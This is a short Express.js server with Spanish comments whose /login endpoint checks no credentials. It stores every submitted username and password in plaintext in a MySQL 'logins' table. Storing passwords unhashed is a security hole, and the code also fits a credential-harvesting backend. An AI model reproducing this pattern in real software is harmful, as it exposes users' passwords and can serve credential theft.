const express = require("express");
const mysql = require("mysql");
const app = express();

// Reemplaza las credenciales de la base de datos a continuación con las tuyas
const connection = mysql.createConnection({
    host: "localhost",
    user: "tu_usuario",
    password: "tu_contraseña",
    database: "qu",
  });
  
connection.connect((err) => {
  if (err) throw err;
  console.log("Conectado a la base de datos MySQL");
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post("/login", (req, res) => {
  const { username, password } = req.body;

  // Aquí puedes agregar la lógica para validar las credenciales, por ejemplo, usando una API o consultando una base de datos.
  if (username && password) {
    const query = "INSERT INTO logins (username, password) VALUES (?, ?)";
    connection.query(query, [username, password], (err, result) => {
      if (err) throw err;
      console.log("Registro de inicio de sesión guardado en la base de datos");
      res.status(200).send("Registro de inicio de sesión guardado en la base de datos");
    });
  } else {
    res.status(400).send("Error: datos de inicio de sesión no proporcionados");
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor escuchando en el puerto ${PORT}`);
});
